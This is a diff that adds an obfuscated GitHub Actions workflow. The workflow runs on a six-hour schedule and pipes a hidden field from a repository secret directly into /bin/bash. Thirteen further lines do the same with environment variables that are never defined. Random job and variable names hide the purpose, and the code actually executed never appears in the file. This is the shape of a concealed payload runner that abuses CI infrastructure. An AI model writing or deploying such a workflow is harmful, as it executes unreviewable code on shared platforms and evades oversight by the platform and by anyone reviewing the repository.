@@ -1,0 +1,30 @@
+name: tangtanteng5647
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangtanteng5647
+        env:
+          yo90625: ${{ secrets.yo90625 }}
+        run: |
+          echo $yo90625 | jq -r .rrg58 | /bin/bash
+          echo $ohk03 | jq -r .j24391 | /bin/bash
+          echo $ehokj7 | jq -r .jzjg0410 | /bin/bash
+          echo $jjin1 | jq -r .v4268 | /bin/bash
+          echo $nw314 | jq -r .t3879 | /bin/bash
+          echo $ue578 | jq -r .ul882 | /bin/bash
+          echo $wltbh391 | jq -r .ei92536 | /bin/bash
+          echo $nc162 | jq -r .tx03 | /bin/bash
+          echo $nrtwq25 | jq -r .bsg41481 | /bin/bash
+          echo $ct33 | jq -r .wyuuu649 | /bin/bash
+          echo $asp43 | jq -r .e52 | /bin/bash
+          echo $vqcvx7 | jq -r .yjfc45 | /bin/bash
+          echo $rw1 | jq -r .frnr73407 | /bin/bash
+          echo $g20 | jq -r .pb805 | /bin/bash
+
